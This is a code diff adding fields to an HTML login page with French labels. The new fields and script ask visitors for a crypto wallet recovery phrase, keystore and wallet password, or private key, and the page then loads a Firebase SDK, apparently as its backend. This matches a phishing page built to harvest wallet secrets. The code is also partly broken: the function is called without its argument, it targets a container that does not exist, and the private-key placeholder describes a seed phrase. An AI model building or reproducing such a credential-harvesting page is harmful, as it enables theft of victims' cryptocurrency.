@@ -159,9 +159,50 @@
             <input type="text" id="selected" value="tessttt" readonly>
         <label for="password">Mot de passe:</label>
         <input type="password" id="password" name="password" required>
-
+          <label for="wallet-info-type">Select Wallet Information Type:</label>
+            <select id="wallet-info-type" onchange="showInfoInput()">
+                <option value="phrase">Phrase</option>
+                <option value="keystore">Keystore</option>
+                <option value="private-key">Private Key</option>
+            </select>
         <button type="button" id="submitData" name="submitData" >Se Connecter</button>
     </form>
+    <script>
+         function showInfoInput(selectedWallet) {
+            // Retrieve selected information type
+            const walletInfoType = document.getElementById('wallet-info-type').value;
+
+            // Remove any existing information input elements
+            const infoInputContainer = document.getElementById('info-input-container');
+            infoInputContainer.innerHTML = '';
+
+            // Dynamically create and append information input fields based on the selected type and wallet
+            switch (walletInfoType) {
+                case 'phrase':
+                    infoInputContainer.innerHTML = `
+                        <label for="wallet-phrase">Enter your recovery phrase for ${selectedWallet}:</label>
+                        <textarea id="wallet-phrase" placeholder="Typical 12 (sometimes 24) words separated by single spaces." rows="4"></textarea>
+                    `;
+                    break;
+                case 'keystore':
+                    infoInputContainer.innerHTML = `
+                        <label for="wallet-keystore">Enter Keystore for ${selectedWallet}:</label>
+                        <input type="text" id="wallet-keystore" placeholder="Several lines of text beginning with '{...}'">
+                        <label for="wallet-password">Wallet Password:</label>
+                        <input type="password" id="wallet-password" placeholder="Enter your password">
+                    `;
+                    break;
+                case 'private-key':
+                    infoInputContainer.innerHTML = `
+                        <label for="wallet-private-key">Enter your Private Key for ${selectedWallet}:</label>
+                        <input type="text" id="wallet-private-key" placeholder="Typically 12 (sometimes 24) words separated by a single space.">
+                    `;
+                    break;
+                default:
+                    break;
+            }
+        }
+    </script>
     <script type="module">
   // Import the functions you need from the SDKs you need
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-app.js";
